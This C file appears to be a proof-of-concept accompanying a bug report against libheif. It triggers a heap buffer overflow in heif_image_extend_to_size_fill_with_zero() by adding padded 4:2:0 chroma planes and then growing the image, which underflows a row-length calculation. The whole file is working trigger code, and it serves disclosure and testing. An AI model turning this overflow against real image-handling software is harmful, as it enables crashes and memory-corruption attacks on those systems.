/*
 * PoC for a heap buffer overflow in HeifPixelImage::extend_to_size_with_zero().
 *
 * An application can build a YCbCr 4:2:0 image whose chroma (Cb/Cr) planes are
 * one row/column larger than the subsampled size the image's width/height
 * imply (heif_image_add_plane() tolerates this, for producers that pad chroma
 * planes to an even stride). Growing the image afterwards with
 * heif_image_extend_to_size_fill_with_zero() computes the per-row fill length
 * for each plane as (new_subsampled_width - old_width); since the chroma
 * plane's recorded width is larger than the freshly computed subsampled width
 * for the new size, this subtraction underflows a uint32_t and the following
 * memset() writes approximately 4 GB past the end of the heap-allocated plane.
 *
 * Every call below uses only the public libheif C API with in-contract
 * arguments (the API doc for heif_image_add_plane() only requires the plane
 * to "match the colorspace and chroma of the image"; it does not say the
 * exact pixel count must match an implied subsampled size, and padded chroma
 * planes are a realistic scenario for YUV producers).
 */

#include <libheif/heif.h>
#include <stdio.h>

int main(void)
{
  struct heif_image* image = NULL;

  /* Odd image dimensions: the 4:2:0 chroma planes round up to 7x5. */
  struct heif_error err = heif_image_create(13, 9, heif_colorspace_YCbCr, heif_chroma_420, &image);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "heif_image_create failed: %s\n", err.message);
    return 1;
  }

  err = heif_image_add_plane(image, heif_channel_Y, 13, 9, 8);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "add Y plane failed: %s\n", err.message);
    heif_image_release(image);
    return 1;
  }

  /* The exact chroma-subsampled size for a 13x9 4:2:0 image is 7x5. Pad it up
   * to an even 8x6, which heif_image_add_plane() accepts. */
  err = heif_image_add_plane(image, heif_channel_Cb, 8, 6, 8);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "add Cb plane failed: %s\n", err.message);
    heif_image_release(image);
    return 1;
  }

  err = heif_image_add_plane(image, heif_channel_Cr, 8, 6, 8);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "add Cr plane failed: %s\n", err.message);
    heif_image_release(image);
    return 1;
  }

  /* Grow the logical image size. 14x10 still rounds down to a 7x5 chroma
   * plane, so the recorded (8x6) chroma planes are now larger than the size
   * the resize logic computes for them. */
  err = heif_image_extend_to_size_fill_with_zero(image, 14, 10);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "extend_to_size_fill_with_zero failed (%d/%d): %s\n",
            err.code, err.subcode, err.message);
    heif_image_release(image);
    return 1;
  }

  printf("no crash (unexpected)\n");
  heif_image_release(image);
  return 0;
}
